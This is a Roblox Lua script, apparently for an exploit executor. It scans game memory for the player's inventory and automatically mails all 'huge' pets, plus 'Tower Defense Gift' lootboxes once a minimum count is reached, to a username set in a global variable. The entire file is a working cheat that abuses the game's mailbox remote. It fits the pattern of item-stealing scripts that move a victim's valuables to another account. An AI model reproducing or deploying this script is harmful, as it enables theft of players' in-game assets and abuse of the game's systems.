local RS = game:GetService("ReplicatedStorage")
local mailRemote = RS:WaitForChild("Network"):WaitForChild("Mailbox: Send")

local inv = nil
repeat
    task.wait(1)
    for i, v in pairs(getgc(true)) do
        if type(v) == "table" and rawget(v, "Inventory") and type(v.Inventory) == "table" then
            inv = v.Inventory
            break
        end
    end
until inv and inv.Pet

if inv.Pet then
    for uid, data in pairs(inv.Pet) do
        if typeof(data) == "table" and data.id and tostring(data.id):lower():find("huge") then
            pcall(function()
                mailRemote:InvokeServer(getgenv().AutoMailUser, "...", "Pet", uid, 1)
            end)
            task.wait(0.5)
        end
    end
end

if inv.Lootbox then
    local gesamtAnzahl = 0
    local zuVerschicken = {}

    for uid, itemData in pairs(inv.Lootbox) do
        if typeof(itemData) == "table" and itemData.id == "Tower Defense Gift" then
            local menge = itemData._am or 1
            gesamtAnzahl += menge
            table.insert(zuVerschicken, {uid=uid, menge=menge})
        end
    end

    if gesamtAnzahl >= getgenv().minGifts then
        for _, eintrag in ipairs(zuVerschicken) do
            pcall(function()
                mailRemote:InvokeServer(getgenv().AutoMailUser, "...", "Lootbox", eintrag.uid, eintrag.menge)
            end)
            task.wait(0.3)
        end
    end
end
